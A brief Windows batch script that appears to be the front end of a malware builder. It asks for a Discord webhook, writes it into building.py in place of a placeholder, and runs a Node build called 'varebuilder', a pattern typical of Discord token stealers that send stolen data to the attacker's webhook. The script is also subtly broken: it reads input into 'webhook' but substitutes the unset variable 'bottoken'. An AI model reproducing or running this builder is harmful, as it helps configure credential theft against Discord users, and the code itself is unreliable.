echo hai1723 very suck ben
set /p webhook="Enter Webhook Discord: "
powershell -Command "(Get-Content building.py) -replace 'REPLACE_YOUR_WEBHOOK', '%bottoken%' | Set-Content building.py"
node build.js varebuilder
